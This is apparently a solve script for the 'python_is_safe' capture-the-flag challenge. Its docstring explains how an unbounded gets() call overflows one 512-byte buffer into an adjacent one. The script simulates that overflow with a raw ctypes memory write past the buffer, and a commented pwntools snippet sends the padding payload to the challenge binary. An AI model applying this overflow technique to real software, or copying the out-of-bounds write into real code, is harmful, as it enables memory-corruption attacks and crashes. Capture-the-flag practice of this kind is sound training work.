#!/usr/bin/env python3
"""
Solve: python_is_safe (Pwn/Misc - Easy)
The binary uses `libc.gets(buf1)` to read into a 512-byte buffer.
`gets` has no bounds checking. buf2 is adjacent in memory.
If we overflow 512+ bytes from buf1, we overwrite buf2.
The check is: `if b'HCMUS-CTF' in bytes(buf2)` - print flag.
Exploit: send 512 bytes padding + 'HCMUS-CTF' anywhere in the overflow.
"""

import ctypes
from ctypes import CDLL, c_buffer

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

buf1 = c_buffer(512)
buf2 = c_buffer(512)

# Overflow buf1 into buf2 with the magic string
# In memory, buf2 immediately follows buf1 (or close enough)
payload = b'A' * 512 + b'HCMUS-CTF{overflow_here}'

# Write through buf1 - gets has no bounds checking
# Simulate by writing to the memory region starting at buf1
target = (ctypes.c_char * 1024).from_address(ctypes.addressof(buf1))
target.raw = payload.ljust(1024, b'\x00')

# Check if the magic string is in buf2
if b'HCMUS-CTF' in bytes(buf2):
    print("Flag would be printed!")
    print("Exploit: send payload of 512+ bytes containing 'HCMUS-CTF'")

# Real exploit script for a running challenge:
# from pwn import *
# p = process('./python_is_safe')
# p.sendline(b'A' * 512 + b'HCMUS-CTF')
# p.interactive()
